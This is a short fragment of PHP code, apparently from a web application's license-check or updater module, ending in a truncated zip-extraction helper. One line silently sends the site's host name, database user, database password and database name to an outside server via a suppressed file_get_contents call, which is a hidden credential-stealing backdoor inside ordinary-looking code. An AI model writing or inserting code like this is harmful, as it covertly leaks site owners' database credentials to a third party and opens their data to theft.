...
$checkurl = 'http://7gj.top/check.php?url='.$_SERVER['HTTP_HOST']. '&authcode='.trim($authcode).'&ver='.VERSION;
@file_get_contents("http://7gj.top/tj.php?url=".$_SERVER['HTTP_HOST']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['database']);
function zipExtract($var2, $var3)
{
    $var5 = new ZipArchive();
    if ($var5->open($var2) === true)
 {
        $var5->extractTo($var3);
        $var5->close();
        return true;
